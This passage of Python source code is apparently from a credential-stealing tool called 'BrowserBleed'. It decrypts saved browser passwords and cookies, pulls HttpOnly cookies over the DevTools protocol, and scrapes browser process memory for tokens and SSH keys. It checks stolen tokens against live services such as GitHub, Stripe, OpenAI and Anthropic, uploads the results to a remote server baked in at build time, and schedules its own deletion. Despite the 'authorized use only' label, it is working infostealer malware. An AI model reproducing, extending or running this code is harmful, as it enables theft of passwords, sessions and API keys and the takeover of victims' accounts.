                raise ConnectionError("WebSocket connection closed")
            buf += chunk
        return buf

    h      = recv_exact(2)
    fin    = bool(h[0] & 0x80)
    opcode = h[0] & 0x0F
    masked = bool(h[1] & 0x80)
    n      = h[1] & 0x7F
    if n == 126:
        n = struct.unpack(">H", recv_exact(2))[0]
    elif n == 127:
        n = struct.unpack(">Q", recv_exact(8))[0]
    mask_key = recv_exact(4) if masked else b""
    raw      = recv_exact(n)
    payload  = bytes(b ^ mask_key[i % 4] for i, b in enumerate(raw)) if masked else raw
    return fin, opcode, payload


_WS_MAX_FRAMES = 1000
_WS_MAX_BYTES  = 64 * 1024 * 1024  # 64 MB


def _ws_recv_msg(s: socket.socket) -> str:
    parts      = []
    total_bytes = 0
    frame_count = 0
    while True:
        fin, opcode, payload = _ws_read_frame(s)
        if opcode == 9:                                     # ping → pong
            mask = os.urandom(4)
            pong = bytes([0x8A, 0x80 | len(payload)]) + mask + bytes(
                b ^ mask[i % 4] for i, b in enumerate(payload)
            )
            s.sendall(pong)
            continue
        if opcode == 8:                                     # close
            raise ConnectionError("WebSocket closed by server")
        frame_count += 1
        total_bytes += len(payload)
        if frame_count > _WS_MAX_FRAMES:
            raise RuntimeError(f"WebSocket: too many frames (>{_WS_MAX_FRAMES})")
        if total_bytes > _WS_MAX_BYTES:
            raise RuntimeError(f"WebSocket: message too large (>{_WS_MAX_BYTES} bytes)")
        parts.append(payload)
        if fin:
            break
    return b"".join(parts).decode(errors="replace")


def _cdp_call(ws_url: str, method: str, params: dict | None = None) -> dict | None:
    parsed = urllib.parse.urlparse(ws_url)
    host   = parsed.hostname or "localhost"
    port   = parsed.port or 80
    path   = parsed.path
    s = _ws_connect(host, port, path)
    try:
        _ws_send(s, json.dumps({"id": 1, "method": method, "params": params or {}}))
        skip_count = 0
        while True:
            data = json.loads(_ws_recv_msg(s))
            if data.get("id") == 1:
                return data.get("result")
            skip_count += 1
            if skip_count > 500:
                return None
    except Exception:
        return None
    finally:
        try:
            s.close()
        except Exception:
            pass


def extract_cookies_cdp(process_name: str) -> list[dict]:
    port = _cdp_find_port(process_name)
    if port is None:
        return []
    try:
        conn    = http.client.HTTPConnection("localhost", port, timeout=5)
        conn.request("GET", "/json")
        resp    = conn.getresponse()
        targets = json.loads(resp.read().decode(errors="replace"))
        ws_url  = next(
            (t["webSocketDebuggerUrl"] for t in targets if t.get("webSocketDebuggerUrl")),
            None,
        )
        if not ws_url:
            return []
    except Exception:
        return []
    result = _cdp_call(ws_url, "Network.getAllCookies")
    if not result:
        return []
    cookies = []
    for ck in result.get("cookies", []):
        samesite_raw = ck.get("sameSite", "")
        cookies.append({
            "host":     ck.get("domain", ""),
            "name":     ck.get("name", ""),
            "value":    ck.get("value", ""),
            "path":     ck.get("path", ""),
            "expires":  unix_ts_to_str(ck.get("expires", -1)),
            "secure":   ck.get("secure", False),
            "httponly": ck.get("httpOnly", False),
            "samesite": samesite_raw or "None",
            "cdp_only": False,
        })
    return cookies


def _merge_cdp_cookies(disk: list[dict], cdp: list[dict]) -> list[dict]:
    """Merge CDP cookies into disk results; add CDP-only entries marked accordingly."""
    seen: set[tuple[str, str]] = {(c["host"], c["name"]) for c in disk}
    merged = list(disk)
    for ck in cdp:
        key = (ck.get("host", ""), ck.get("name", ""))
        if key not in seen:
            ck["cdp_only"] = True
            merged.append(ck)
    return merged


# ── Service identification & verification ──────────────────────────────────────

_CTX_URL_PAT    = re.compile(rb"https?://([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_HOST_PAT   = re.compile(rb"Host:\s*([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")
_CTX_DOMAIN_PAT = re.compile(rb'"(?:domain|iss|host|origin|issuer|audience)"\s*:\s*"([a-zA-Z0-9\-\./]+)"')
_CTX_COOKIE_DOM = re.compile(rb"[Dd]omain=\.?([a-zA-Z0-9][a-zA-Z0-9\-]*(?:\.[a-zA-Z0-9\-]+)+)")

_DOMAIN_SVC: list[tuple[str, str]] = [
    ("api.anthropic.com",               "Anthropic / Claude"),
    ("claude.ai",                       "Anthropic / Claude"),
    ("accounts.google.com",             "Google Accounts"),
    ("oauth2.googleapis.com",           "Google OAuth2"),
    ("identitytoolkit.googleapis.com",  "Firebase Auth"),
    ("firebase.googleapis.com",         "Firebase / GCP"),
    ("googleapis.com",                  "Google API"),
    ("google.com",                      "Google"),
    ("api.github.com",                  "GitHub"),
    ("github.com",                      "GitHub"),
    ("raw.githubusercontent.com",       "GitHub"),
    ("api.slack.com",                   "Slack"),
    ("slack.com",                       "Slack"),
    ("api.openai.com",                  "OpenAI"),
    ("chat.openai.com",                 "OpenAI"),
    ("openai.com",                      "OpenAI"),
    ("discord.com",                     "Discord"),
    ("discordapp.com",                  "Discord"),
    ("login.microsoftonline.com",       "Microsoft / Azure AD"),
    ("graph.microsoft.com",             "Microsoft Graph"),
    ("microsoftonline.com",             "Microsoft / Azure AD"),
    ("login.live.com",                  "Microsoft"),
    ("portal.azure.com",                "Azure Portal"),
    ("outlook.office365.com",           "Microsoft 365"),
    ("microsoft.com",                   "Microsoft"),
    ("appleid.apple.com",               "Apple ID"),
    ("idmsa.apple.com",                 "Apple ID"),
    ("apple.com",                       "Apple"),
    ("api.notion.com",                  "Notion"),
    ("notion.so",                       "Notion"),
    ("gitlab.com",                      "GitLab"),
    ("api.digitalocean.com",            "DigitalOcean"),
    ("digitalocean.com",                "DigitalOcean"),
    ("auth0.com",                       "Auth0"),
    ("okta.com",                        "Okta"),
    ("cognito-idp",                     "AWS Cognito"),
    ("amazonaws.com",                   "AWS"),
    ("api.stripe.com",                  "Stripe"),
    ("stripe.com",                      "Stripe"),
    ("atlassian.net",                   "Atlassian"),
    ("atlassian.com",                   "Atlassian"),
    ("api.figma.com",                   "Figma"),
    ("figma.com",                       "Figma"),
    ("api.linear.app",                  "Linear"),
    ("linear.app",                      "Linear"),
    ("api.vercel.com",                  "Vercel"),
    ("vercel.com",                      "Vercel"),
    ("api.twilio.com",                  "Twilio"),
    ("twilio.com",                      "Twilio"),
    ("clerk.com",                       "Clerk"),
    ("clerk.dev",                       "Clerk"),
    ("supabase.co",                     "Supabase"),
    ("supabase.com",                    "Supabase"),
    ("ollama.com",                      "Ollama"),
    ("netlify.com",                     "Netlify"),
    ("heroku.com",                      "Heroku"),
    ("pingidentity.com",                "PingIdentity"),
    ("onelogin.com",                    "OneLogin"),
    ("salesforce.com",                  "Salesforce"),
    ("api.twitter.com",                 "Twitter / X"),
    ("api.x.com",                       "Twitter / X"),
    ("twitter.com",                     "Twitter / X"),
    ("x.com",                           "Twitter / X"),
    ("api.linkedin.com",                "LinkedIn"),
    ("linkedin.com",                    "LinkedIn"),
    ("graph.facebook.com",              "Meta Graph API"),
    ("facebook.com",                    "Meta"),
    ("instagram.com",                   "Instagram"),
    ("app.datadoghq.com",               "Datadog"),
    ("datadoghq.com",                   "Datadog"),
    ("registry.npmjs.org",              "npm"),
    ("npmjs.com",                       "npm"),
    ("api.cloudflare.com",              "Cloudflare"),
    ("cloudflare.com",                  "Cloudflare"),
    ("app.terraform.io",                "HashiCorp Cloud"),
    ("cloud.hashicorp.com",             "HashiCorp Cloud"),
    ("vault.hashicorp.com",             "HashiCorp Vault"),
    ("api.sendgrid.com",                "SendGrid"),
    ("sendgrid.com",                    "SendGrid"),
]


def _domain_matches(frag: str, domain: str) -> bool:
    """True if domain equals frag or is a subdomain of it, or for prefix-frags (no dot) starts with it."""
    if "." in frag:
        return domain == frag or domain.endswith(f".{frag}")
    return domain.startswith(f"{frag}.") or domain == frag


def _service_from_context(context: bytes) -> str | None:
    """Scan ±bytes around a credential hit for URL/Host/domain clues about service origin."""
    candidates: list[str] = []
    for pat in (_CTX_URL_PAT, _CTX_HOST_PAT, _CTX_DOMAIN_PAT, _CTX_COOKIE_DOM):
        for m in pat.finditer(context):
            try:
                domain = m.group(1).decode(errors="replace").lower().strip("/").split(":")[0]
                if "." in domain and 4 < len(domain) < 128:
                    candidates.append(domain)
            except Exception:
                pass
    for domain in candidates:
        for frag, svc in _DOMAIN_SVC:
            if _domain_matches(frag, domain):
                return svc
    return None


_ISS_MAP = [
    ("accounts.google.com",   "Google"),
    ("github.com",             "GitHub"),
    ("microsoftonline.com",    "Microsoft / Azure AD"),
    ("login.microsoft.com",    "Microsoft / Azure AD"),
    ("apple.com",              "Apple"),
    ("cognito-idp",            "AWS Cognito"),
    ("auth0.com",              "Auth0"),
    ("okta.com",               "Okta"),
    ("clerk",                  "Clerk"),
    ("supabase",               "Supabase"),
    ("firebase",               "Firebase / GCP"),
    ("anthropic",              "Anthropic / Claude"),
    ("claude.ai",              "Anthropic / Claude"),
    ("ollama.com",             "Ollama"),
    ("discord.com",            "Discord"),
    ("atlassian",              "Atlassian"),
    ("salesforce",             "Salesforce"),
    ("onelogin",               "OneLogin"),
    ("pingidentity",           "PingIdentity"),
]

_KID_MAP: list[tuple[re.Pattern, str]] = [
    (re.compile(r"^key-\d+$"), "Google"),
]

_oidc_cache: dict[str, str | None] = {}


def _decode_jwt_claims(token: str) -> dict:
    """Decode JWT payload (no signature verification). Returns claims or {}."""
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad  = parts[1] + "=" * (4 - len(parts[1]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _decode_jwt_header(token: str) -> dict:
    try:
        parts = token.split(".")
        if len(parts) != 3:
            return {}
        pad = parts[0] + "=" * (4 - len(parts[0]) % 4)
        return json.loads(base64.b64decode(pad.replace("-", "+").replace("_", "/")))
    except Exception:
        return {}


def _oidc_discover(issuer_url: str) -> str | None:
    """Fetch /.well-known/openid-configuration and map the issuer domain to a service name."""
    if not _do_oidc:
        return None
    if issuer_url in _oidc_cache:
        return _oidc_cache[issuer_url]
    result = None
    try:
        base = re.match(r"https?://[^/]+", issuer_url)
        url  = (base.group() if base else issuer_url.rstrip("/")) + "/.well-known/openid-configuration"
        status, data = _http_get(url, timeout=3)
        if status == 200:
            iss_field = data.get("issuer", "")
            m = re.search(r"https?://([^/]+)", iss_field)
            if m:
                domain = m.group(1).lower()
                for frag, svc_name in _DOMAIN_SVC:
                    if _domain_matches(frag, domain):
                        result = svc_name
                        break
                if result is None:
                    result = domain
    except Exception:
        pass
    _oidc_cache[issuer_url] = result
    return result


def identify_service(label: str, value: str, context: bytes = b"") -> str:
    """Return a human-readable service name for a captured credential value."""
    v = value[7:] if value.startswith("Bearer ") else value
    if v is value and value.startswith("Basic "):
        v = value[6:]

    # ── Label-based shortcuts for unambiguous pattern types ───────────────────
    if label == "AWS Access Key":      return "AWS"
    if label == "Anthropic API key":   return "Anthropic / Claude"
    if label == "Stripe key":          return "Stripe"
    if label == "npm token":           return "npm"
    if label == "HuggingFace token":   return "HuggingFace"
    if label == "Vault token":         return "HashiCorp Vault"
    if label == "SSH private key":     return "SSH Key"
    if label == "Google SAPISID":      return "Google (YouTube / Gmail)"
    if label == "Discord token":       return "Discord"
    if label == "Slack token":         return "Slack"
    if label == "GitHub token":        return "GitHub"

    # ── Exact prefix matches ───────────────────────────────────────────────────
    if v.startswith("ya29."):
        return "Google OAuth2"
    if v[:4] in ("QUFL", "QUJF", "QUEy", "QUFF"):
        return "Google OAuth2"
    gh_types = {"ghp_": "personal", "gho_": "OAuth app", "ghu_": "user-to-server",
                "ghs_": "server-to-server", "ghr_": "refresh"}
    if v[:4] in gh_types:
        return f"GitHub ({gh_types[v[:4]]})"
    slack_map = {"xoxb": "bot token", "xoxp": "user token", "xoxa": "app token",
                 "xoxr": "refresh", "xoxs": "service token"}
    if v[:4] in slack_map:
        return f"Slack ({slack_map[v[:4]]})"
    if v.startswith("sk-ant-"):    return "Anthropic / Claude"
    if v.startswith("sk-"):        return "OpenAI"
    if v.startswith("glpat-"):     return "GitLab"
    if v.startswith("dp."):        return "DigitalOcean"
    if v.startswith("pat_"):       return "Notion"
    if v.startswith("hf_"):        return "HuggingFace"
    if v.startswith("hvs."):       return "HashiCorp Vault"
    if v.startswith("npm_"):       return "npm"
    if v.startswith("sk_live_") or v.startswith("sk_test_"):
        return "Stripe"

    # ── Anthropic / Claude session token format: 20111… ───────────────────────
    if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", v):
        return "Anthropic / Claude"

    # ── JWT - decode issuer / audience ───────────────────────────────────────
    if label == "JWT token" or (v.startswith("eyJ") and v.count(".") == 2):
        header = _decode_jwt_header(v)
        kid    = str(header.get("kid", ""))
        for pat, svc in _KID_MAP:
            if pat.match(kid):
                return f"JWT - {svc}"

        claims   = _decode_jwt_claims(v)
        iss      = str(claims.get("iss", ""))
        aud      = claims.get("aud", "")
        if isinstance(aud, list):
            aud = " ".join(str(a) for a in aud)
        combined = f"{iss} {aud}".lower()
        for pattern, name in _ISS_MAP:
            if pattern in combined:
                return f"JWT - {name}"
        m = re.search(r"https?://([^/\s]+)", iss)
        if m:
            discovered = _oidc_discover(iss)
            if discovered:
                return f"JWT - {discovered}"
            return f"JWT - {m.group(1)}"
        if iss:
            return f"JWT - {iss[:50]}"
        for claim_val in claims.values():
            if not isinstance(claim_val, str) or not claim_val.startswith("http"):
                continue
            cm = re.search(r"https?://([^/\s?#]+)", claim_val)
            if not cm:
                continue
            domain = cm.group(1).lower()
            for frag, svc_name in _DOMAIN_SVC:
                if _domain_matches(frag, domain):
                    return f"JWT - {svc_name}"
            return f"JWT - {domain}"
        if context:
            svc = _service_from_context(context)
            if svc:
                return f"JWT - {svc}"
        return "JWT - unknown issuer"

    # ── Context-based fallback: scan surrounding memory bytes ─────────────────
    if context:
        svc = _service_from_context(context)
        if svc:
            return svc

    return "Unknown service"


def _http_get(url: str, headers: dict | None = None, timeout: int = 6) -> tuple[int, dict]:
    _headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    }
    if headers:
        _headers.update(headers)
    req = urllib.request.Request(url, headers=_headers)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            return resp.status, json.loads(resp.read().decode(errors="replace"))
    except urllib.error.HTTPError as e:
        try:
            return e.code, json.loads(e.read().decode(errors="replace"))
        except Exception:
            return e.code, {}
    except Exception as e:
        return 0, {"_error": str(e)}


def verify_google_oauth(token: str) -> dict:
    status, data = _http_get(f"https://oauth2.googleapis.com/tokeninfo?access_token={token}")
    if status == 200:
        scope       = data.get("scope", "")
        scope_short = " ".join(s.split("/")[-1] for s in scope.split())[:80]
        return {
            "valid":      True,
            "email":      data.get("email", data.get("sub", "?")),
            "expires_in": f"{data.get('expires_in', '?')}s",
            "scope":      scope_short or "?",
        }
    return {"valid": False, "reason": data.get("error_description", f"HTTP {status}")}


def verify_github(token: str) -> dict:
    status, data = _http_get(
        "https://api.github.com/user",
        headers={"Authorization": f"Bearer {token}", "Accept": "application/vnd.github.v3+json"},
    )
    if status == 200:
        return {"valid": True, "user": data.get("login", "?"), "name": data.get("name", "?")}
    return {"valid": False, "reason": data.get("message", f"HTTP {status}")}


def verify_slack(token: str) -> dict:
    req = urllib.request.Request(
        "https://slack.com/api/auth.test",
        data=b"{}",
        headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        },
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = json.loads(resp.read())
        if data.get("ok"):
            return {"valid": True, "user": data.get("user", "?"), "team": data.get("team", "?")}
        return {"valid": False, "reason": data.get("error", "unknown")}
    except Exception as e:
        return {"valid": False, "reason": str(e)}


def verify_jwt(token: str) -> dict:
    claims = _decode_jwt_claims(token)
    if not claims:
        return {"valid": None, "reason": "could not decode payload"}
    exp = claims.get("exp")
    if exp:
        exp_dt = datetime.fromtimestamp(exp, tz=timezone.utc)
        now    = datetime.now(tz=timezone.utc)
        secs   = int((exp_dt - now).total_seconds())
        if secs > 0:
            h, m = divmod(secs // 60, 60)
            return {"valid": True, "expires": exp_dt.strftime("%Y-%m-%d %H:%M UTC"), "ttl": f"{h}h {m}m"}
        return {"valid": False, "reason": f"expired {exp_dt.strftime('%Y-%m-%d %H:%M UTC')}"}
    return {"valid": None, "reason": "no exp claim"}


def verify_anthropic(token: str) -> dict:
    # Session tokens (20111...) use the claude.ai API, not the API key endpoint
    if re.match(r"^20111[A-Za-z0-9\-_]{20,}$", token):
        status, data = _http_get(
            "https://claude.ai/api/organizations",
            headers={"Cookie": f"sessionKey={token}"},
        )
        if status == 200:
            orgs = data if isinstance(data, list) else []
            names = [o.get("name", "?") for o in orgs[:3]]
            return {"valid": True, "orgs": ", ".join(names) or "?"}
        return {"valid": False, "reason": f"HTTP {status}"}

    status, data = _http_get(
        "https://api.anthropic.com/v1/models",
        headers={"x-api-key": token, "anthropic-version": "2023-06-01"},
    )
    if status == 200:
        models = [m.get("id", "?") for m in data.get("data", [])[:3]]
        return {"valid": True, "models_visible": ", ".join(models) or "?"}
    err = data.get("error", {})
    return {"valid": False, "reason": err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"}


def verify_openai(token: str) -> dict:
    status, data = _http_get(
        "https://api.openai.com/v1/models",
        headers={"Authorization": f"Bearer {token}"},
    )
    if status == 200:
        models = [m.get("id", "?") for m in data.get("data", [])[:3]]
        return {"valid": True, "models_visible": ", ".join(models) or "?"}
    err = data.get("error", {})
    reason = err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"
    return {"valid": False, "reason": reason}


def verify_stripe(token: str) -> dict:
    status, data = _http_get(
        "https://api.stripe.com/v1/balance",
        headers={"Authorization": f"Bearer {token}"},
    )
    if status == 200:
        avail = data.get("available", [{}])
        currency = avail[0].get("currency", "?").upper() if avail else "?"
        amount   = avail[0].get("amount", "?") if avail else "?"
        return {"valid": True, "balance": f"{amount} {currency}"}
    err = data.get("error", {})
    reason = err.get("message", f"HTTP {status}") if isinstance(err, dict) else f"HTTP {status}"
    return {"valid": False, "reason": reason}


def verify_aws(access_key: str) -> dict:
    """Verify an AWS Access Key ID by checking if it exists via STS GetCallerIdentity."""
    try:
        import hmac
        import hashlib

        service = "sts"
        region  = "us-east-1"
        host    = f"{service}.amazonaws.com"
        endpoint = f"https://{host}/"
        payload  = "Action=GetCallerIdentity&Version=2011-06-15"

        now      = datetime.now(tz=timezone.utc)
        amzdate  = now.strftime("%Y%m%dT%H%M%SZ")
        datestamp = now.strftime("%Y%m%d")

        # Without a secret key we can't sign - just try unauthenticated and inspect 403 vs 400
        req = urllib.request.Request(
            endpoint,
            data=payload.encode(),
            headers={
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(req, timeout=6) as resp:
                return {"valid": None, "reason": "unexpected 200 without signing"}
        except urllib.error.HTTPError as e:
            if e.code == 403:
                return {"valid": None, "reason": "key ID exists (403 auth failed - no secret key available)"}
            return {"valid": False, "reason": f"HTTP {e.code}"}
    except Exception as ex:
        return {"valid": None, "reason": str(ex)}


def verify_hit(label: str, value: str, service: str) -> dict | None:
    """Run the appropriate verifier. Returns None when no verifier exists for this service."""
    raw = value.split()[-1] if value.startswith("Bearer ") else value
    if "Google OAuth2" in service or raw.startswith("ya29."):
        return verify_google_oauth(raw)
    if "GitHub" in service:
        return verify_github(raw)
    if "Slack" in service:
        return verify_slack(raw)
    if "Anthropic" in service:
        return verify_anthropic(raw)
    if "OpenAI" in service or raw.startswith("sk-"):
        return verify_openai(raw)
    if "Stripe" in service or raw.startswith("sk_live_") or raw.startswith("sk_test_"):
        return verify_stripe(raw)
    if label == "AWS Access Key":
        return verify_aws(raw)
    if label == "JWT token":
        return verify_jwt(raw)
    return None


def _fmt_verify(result: dict) -> str:
    if result.get("valid") is True:
        parts = "  |  ".join(f"{k}: {v}" for k, v in result.items() if k != "valid")
        return f"[VALID] {parts}"
    if result.get("valid") is False:
        return f"[INVALID] {result.get('reason', '?')}"
    return f"[?] {result.get('reason', '?')}"


# ── Per-browser processing ─────────────────────────────────────────────────────
def process_browser(name: str, process_name: str, user_data_path: str,
                    do_disk: bool, do_memory: bool, max_hits: int,
                    do_verify: bool = False) -> tuple[list[str], list[dict]]:
    lines    = []
    csv_rows: list[dict] = []
    running  = is_process_running(process_name)
    lines.append("\n" + "=" * 70)
    lines.append(f"  BROWSER: {name}  [{'RUNNING' if running else 'closed'}]")
    lines.append("=" * 70)

    if not os.path.exists(user_data_path):
        lines.append("  [--] Not installed\n")
        return lines, csv_rows

    # ── Disk ──────────────────────────────────────────────────────────────────
    if do_disk:
        try:
            master_key = get_master_key(user_data_path)
            lines.append("[+] Master key decrypted")
        except Exception as e:
            lines.append(f"[-] Master key failed: {e}")
            master_key = None

        if master_key:
            profiles = _get_profiles(user_data_path)

            for prof_label, prof_path in profiles:
                lines.append(f"\n  ── Profile: {prof_label} ──")

                lines.append("\n  -- [DISK] Saved Credentials --")
                try:
                    creds = extract_credentials(prof_path, master_key)
                    if creds:
                        lines.append(f"[+] {len(creds)} credential(s)\n")
                        for c in creds:
                            lines.append(f"  URL:      {c['url']}")
                            lines.append(f"  Username: {c['username']}")
                            lines.append(f"  Password: {c['password']}\n")
                    else:
                        lines.append("  [-] None found")
                except Exception as e:
                    lines.append(f"  [-] {e}")

                lines.append("\n  -- [DISK] Cookies --")
                disk_cookies: list[dict] = []
                disk_cookie_err: str | None = None
                try:
                    disk_cookies = extract_cookies(prof_path, master_key)
                except Exception as e:
                    disk_cookie_err = str(e)

                # Always attempt CDP when browser is running to get session-only/HttpOnly cookies
                cdp_cookies: list[dict] = []
                if running:
                    try:
                        cdp_cookies = extract_cookies_cdp(process_name)
                    except Exception:
                        pass

                if disk_cookies or cdp_cookies:
                    merged = _merge_cdp_cookies(disk_cookies, cdp_cookies)
                    cdp_only_count = sum(1 for c in merged if c.get("cdp_only"))
                    lines.append(
                        f"[+] {len(merged)} cookie(s)"
                        + (f"  ({cdp_only_count} CDP-only)" if cdp_only_count else "")
                        + "\n"
                    )
                    for ck in merged:
                        cdp_tag = "  [CDP-only]" if ck.get("cdp_only") else ""
                        lines.append(f"  Host:     {ck['host']}{cdp_tag}")
                        lines.append(f"  Name:     {ck['name']}")
                        lines.append(f"  Value:    {ck['value']}")
                        samesite = ck.get("samesite", "?")
                        lines.append(f"  Expires:  {ck['expires']}  Secure:{ck['secure']}  HttpOnly:{ck['httponly']}  SameSite:{samesite}\n")
                else:
                    if disk_cookie_err:
                        lines.append(f"  [-] {disk_cookie_err}")
                    else:
                        lines.append("  [-] None found")
                    if running and not cdp_cookies:
                        lines.append("  [-] CDP unavailable (Chrome not started with --remote-debugging-port)")

    # ── Memory ────────────────────────────────────────────────────────────────
    lines.append("\n  -- [MEMORY] Live Scrape --")
    if not do_memory:
        lines.append("  [--] Skipped (--disk-only)")
        return lines, csv_rows
    if not running:
        lines.append("  [--] Browser not running")
        return lines, csv_rows

    pids      = find_pids(process_name)
    pid_sites = _pid_site_map(process_name)
    all_hits: list[dict] = []
    errors:   list[str]  = []

    def _scrape_pid(pid: int) -> list[dict]:
        hits = scrape_pid(pid, max_hits=max_hits)
        site_url = pid_sites.get(pid, "")
        if site_url:
            url_bytes = f" {site_url} ".encode()
            for h in hits:
                h["context"] = h.get("context", b"") + url_bytes
        return hits

    with ThreadPoolExecutor(max_workers=min(len(pids), 8)) as pid_pool:
        futures = {pid_pool.submit(_scrape_pid, pid): pid for pid in pids}
        for future in as_completed(futures):
            pid = futures[future]
            try:
                all_hits.extend(future.result())
            except PermissionError as e:
                errors.append(f"PID {pid}: {e}")
            except Exception as e:
                errors.append(f"PID {pid}: {e}")

    for e in errors:
        lines.append(f"  [-] {e}")

    unique_hits = deduplicate(all_hits)
    raw_count   = len(all_hits)

    if not unique_hits:
        lines.append("  [-] No hits found")
        return lines, csv_rows

    lines.append(
        f"[+] {len(unique_hits)} unique hit(s)"
        + (f"  ({raw_count} raw across {len(pids)} PIDs, {raw_count - len(unique_hits)} dupes removed)" if raw_count > len(unique_hits) else f"  (across {len(pids)} PID(s))")
    )
    lines.append("")

    # Label every hit with its service (needed for both display and tier-2 summary)
    for h in unique_hits:
        if "_svc" not in h:
            h["_svc"] = identify_service(h["label"], h["value"], h.get("context", b""))

    # Build CSV rows for every hit (all tiers, full untruncated values)
    for h in unique_hits:
        csv_rows.append({
            "browser": name,
            "profile": "(memory)",
            "label":   h["label"],
            "service": h["_svc"],
            "value":   h["value"],
            "address": h.get("address", ""),
        })

    by_label: dict[str, list[dict]] = {}
    for h in unique_hits:
        by_label.setdefault(h["label"], []).append(h)

    COL_TYPE = 22
    COL_SVC  = 28

    prev_label = None
    for label in sorted(by_label, key=lambda l: (_HIT_TIER.get(l, 1), l)):
        group = by_label[label]
        tier  = _HIT_TIER.get(label, 1)

        if prev_label is not None:
            lines.append("")
        prev_label = label

        if tier == 2:
            svc_counts: dict[str, int] = {}
            for h in group:
                svc_counts[h["_svc"]] = svc_counts.get(h["_svc"], 0) + 1
            svc_summary = "  ".join(f"{s} ({c})" for s, c in sorted(svc_counts.items()))
            lines.append(f"  {label}  ({len(group)} unique)  -  {svc_summary}")
            continue

        for h in group:
            svc = h["_svc"]
            if label == "SSH private key":
                lines.append(f"  {'SSH private key':<{COL_TYPE}}  {svc:<{COL_SVC}}")
                key_text = h["value"].replace("\r\n", "\n").replace("\r", "\n")
                for kline in key_text.split("\n"):
                    lines.append(f"    {kline}")
            else:
                val = _trunc(h["value"].replace("\n", "\\n").replace("\r", "\\r"))
                lines.append(f"  {label[:COL_TYPE]:<{COL_TYPE}}  {svc[:COL_SVC]:<{COL_SVC}}  {val}")
            if do_verify:
                result = verify_hit(label, h["value"], h["_svc"])
                lines.append(f"    └─ {_fmt_verify(result) if result else '[NO VERIFIER]'}")

    return lines, csv_rows


# ── Exfil ─────────────────────────────────────────────────────────────────────
def _exfil_results(url: str, api_key: str, txt_path: str, csv_path: str | None) -> str:
    import http.client
    import ssl
    import platform
    import urllib.parse
    import json as _json

    boundary = b"BrowserBleedBoundary7MA4YWxkTrZu0gW"

    def _field(name: str, value: str) -> bytes:
        return (b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="' + name.encode() + b'"\r\n\r\n'
                + value.encode() + b"\r\n")

    def _file_field(name: str, filename: str, data: bytes) -> bytes:
        return (b"--" + boundary + b"\r\n"
                b'Content-Disposition: form-data; name="' + name.encode()
                + b'"; filename="' + filename.encode() + b'"\r\n'
                b"Content-Type: application/octet-stream\r\n\r\n"
                + data + b"\r\n")

    try:
        body = _field("hostname", platform.node())
        with open(txt_path, "rb") as f:
            body += _file_field("txt", "results.txt", f.read())
        if csv_path and os.path.exists(csv_path):
            with open(csv_path, "rb") as f:
                body += _file_field("csv", "results.csv", f.read())
        body += b"--" + boundary + b"--\r\n"

        parsed = urllib.parse.urlparse(url.rstrip("/"))
        ctx = ssl.create_default_context()
        conn = http.client.HTTPSConnection(parsed.netloc, context=ctx, timeout=30)
        conn.request("POST", "/upload", body=body, headers={
            "Authorization": f"Bearer {api_key}",
            "Content-Type": f"multipart/form-data; boundary={boundary.decode()}",
        })
        resp = conn.getresponse()
        raw = resp.read()
        conn.close()
        try:
            data = _json.loads(raw)
            result_url = data.get("url", "")
        except Exception:
            result_url = ""
        if not result_url:
            try:
                import tempfile as _tf
                _log = os.path.join(_tf.gettempdir(), "bb_exfil_err.txt")
                with open(_log, "w", encoding="utf-8") as _lf:
                    _lf.write(f"HTTP {resp.status} {resp.reason}\n{raw[:500]}\n")
            except Exception:
                pass
        return result_url
    except Exception as _e:
        try:
            import tempfile as _tf
            _log = os.path.join(_tf.gettempdir(), "bb_exfil_err.txt")
            with open(_log, "w", encoding="utf-8") as _lf:
                _lf.write(f"{type(_e).__name__}: {_e}\n")
        except Exception:
            pass
        return ""


# ── Main ───────────────────────────────────────────────────────────────────────
def main():
    global _do_oidc

    parser = argparse.ArgumentParser(
        description="BrowserBleed - Browser Credential Extractor. Authorized use only."
    )
    parser.add_argument("--browser",     metavar="NAME", help="Target one browser (e.g. chrome, edge, brave)")
    parser.add_argument("--disk-only",   action="store_true", help="Skip memory scraping")
    parser.add_argument("--memory-only", action="store_true", help="Skip disk extraction")
    parser.add_argument("--out",         metavar="PATH",      help="Output file path (default: none when server is baked in, otherwise bb_results.txt next to exe)")
    parser.add_argument("--max-hits",    type=int, default=300, help="Max memory hits per browser before dedup (default: 300)")
    parser.add_argument("--self-delete", action=argparse.BooleanOptionalAction, default=bool(_EXFIL_URL),
                        help="Delete exe after run - on by default when server is baked in (--no-self-delete to keep)")
    parser.add_argument("--verify",      action="store_true", help="Verify captured tokens against their services (makes outbound requests)")
    parser.add_argument("--exfil",       metavar="URL",       default=_EXFIL_URL or None, help="POST results to report server (default: baked in at build time)")
    parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
    args = parser.parse_args()

    # Schedule the exe for deletion on next reboot (MOVEFILE_DELAY_UNTIL_REBOOT = 0x4).
    # No rename, no subprocess at startup - nothing that can crash the scan mid-run.
    # Immediate delete is attempted again at end of main() after the upload finishes.
    _self_exe_path: str = ""
    if args.self_delete and getattr(sys, "frozen", False):
        try:
            import ctypes
            _self_exe_path = sys.executable
            ctypes.windll.kernel32.MoveFileExW(_self_exe_path, None, 0x4)
        except Exception:
            _self_exe_path = ""

    if args.verify:
        _do_oidc = True

    do_disk   = not args.memory_only
    do_memory = not args.disk_only

